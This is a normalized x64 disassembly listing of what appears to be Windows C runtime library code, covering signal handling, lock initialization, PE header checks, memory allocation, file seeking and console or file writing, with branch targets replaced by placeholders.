mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_18001eb88
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_180020db0
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_1800259a4
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_1800258a4
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_180025550
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_180025758
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_180025798
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_18002581c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_18001c80c
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_1800258bc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_18001e650
lea ecx [ rsi + 0x1d ]
call sub_18001e3f0
mov ecx 0xff
call sub_180020a8c
mov ecx 0x28
call sub_180020800
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_1800259a4
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_18001e6e4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_18001c80c
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_18001c80c
call sub_18001e6e4
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_1800259a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_1800258bc
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_180020dcc
sub_180025a80
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_180025a30
call rax
call sub_180025a60
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_180025a30
add rsp 0x28
retn
sub_180025ae0
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180025b10
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180025b60
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_180025ae0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180025b10
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_180025bac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
imul rbx r8
test rcx rcx
je r-xdata
xor edx edx
lea rax [ rdi - 0x20 ]
div rbx
cmp rax r8
jae r-xdata
mov rdx rbx
mov rcx rsi
call sub_18001da9c
mov rsi rax
test rax rax
je r-xdata
call sub_180020a14
mov rdi rax
call sub_18001e6e4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rax rsi
cmp rdi rbx
jae r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub rbx rdi
lea rcx [ rdi + rax ]
xor edx edx
mov r8 rbx
call sub_18001c9f0
sub_180025c34
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180025c6c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_1800286c8
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_18001e724
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_180025d04
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18002873c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_180025c6c
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_1800287e4
mov rax rbx
jmp r-xdata
sub_180025de8
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_1800285c0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_18001e704
and [ rax ] edi
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_18002667c
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_180025c6c
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_18001ec0c
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_18001e6e4
mov [ rax ] 0x1c
call sub_18001e704
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_18001e724
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_180026cf8
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180026ca8
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_18002880c
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_180026ca8
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_18002880c
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_180026548
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18002873c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_180025de8
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_1800287e4
mov eax ebx
jmp r-xdata
sub_180026628
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_180020800
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_18002667c
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_1800266e4
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_180020880
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_180020880
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_1800267ec
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_1800259a4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
